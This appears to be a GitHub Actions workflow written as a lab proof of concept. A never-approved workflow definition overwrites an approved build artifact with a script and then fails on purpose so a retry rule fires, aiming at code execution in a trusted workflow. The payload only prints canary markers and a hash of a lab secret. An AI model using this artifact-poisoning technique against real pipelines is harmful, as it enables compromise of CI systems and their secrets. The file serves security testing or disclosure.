name: AR-PLAIN
on:
  pull_request:
jobs:
  plain:
    runs-on: ubuntu-latest
    steps:
      - name: definition marker
        run: |
          echo "DEFN_VERSION=2-NEVER-APPROVED"
          echo "DEFN_ATTEMPT=${{ github.run_attempt }}"
          echo "DEFN_PINNED_GITHUB_SHA=$GITHUB_SHA"
          echo "DEFN_EVENT_HEAD_SHA=${{ github.event.pull_request.head.sha }}"
      - name: step that exists only in definition 2
        run: echo "DEFN_NEW_STEP_RAN=yes"
      - name: build the payload from the definition itself, no checkout
        run: |
          mkdir -p out
          printf '%s\n' \
            'echo "H48F-ARTIFACT-DEFN2-NEVER-APPROVED"' \
            'echo "H48F_RCE_IN_TRUSTED_WORKFLOW=yes"' \
            'echo "H48F_REPO=$GITHUB_REPOSITORY"' \
            'echo "H48F_EVENT=$GITHUB_EVENT_NAME"' \
            'echo "H48F_REF=$GITHUB_REF"' \
            'echo "H48F_SECRET_LEN=${#LAB_SECRET}"' \
            'echo "H48F_SECRET_SHA256=$(printf %s "$LAB_SECRET" | sha256sum | cut -d" " -f1)"' \
            > out/report.sh
          cat out/report.sh
      - name: upload, overwriting the approved artifact
        uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: out/
          overwrite: true
      - name: fail so the retry rule matches
        run: exit 1
